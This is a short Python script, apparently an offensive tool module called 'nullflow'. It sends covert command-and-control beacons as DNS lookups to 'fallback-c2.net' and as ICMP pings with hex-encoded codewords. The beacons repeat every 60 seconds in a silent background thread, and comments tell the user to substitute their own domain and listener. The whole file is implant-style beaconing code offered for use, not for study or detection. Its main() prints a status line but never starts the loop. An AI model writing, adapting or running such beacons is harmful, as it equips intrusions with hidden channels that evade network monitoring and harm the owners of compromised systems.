import os
import time
import random
import subprocess
import threading

def generate_beacon_payload():
    phrases = [
        "pulse.active",
        "ghost.sync",
        "node.idle",
        "zero.trace",
        "drop.link",
        "chk.route",
        "null.flow"
    ]
    return random.choice(phrases)

def dns_beacon(domain):
    payload = generate_beacon_payload()
    query = f"{payload}.{domain}"
    try:
        subprocess.run(["nslookup", query], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        pass

def icmp_beacon(host):
    payload = generate_beacon_payload().encode()
    try:
        subprocess.run(["ping", "-c", "1", "-p", payload.hex(), host],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        pass

def run():
    domain = "fallback-c2.net"  # Replace with your domain
    host = "8.8.8.8"             # Replace with internal listener IP or public fallback

    console_output = f"[nullflow] DNS beacon -> {domain} | ICMP beacon -> {host}"
    print(console_output)

    def beacon_loop():
        while True:
            dns_beacon(domain)
            icmp_beacon(host)
            time.sleep(60)  # Beacon interval (60s)

    threading.Thread(target=beacon_loop, daemon=True).start()

def main(args=None):
    print("[nullflow] DNS beacon -> fallback-c2.net | ICMP beacon -> 8.8.8.8")

if __name__ == "__main__":
    main()
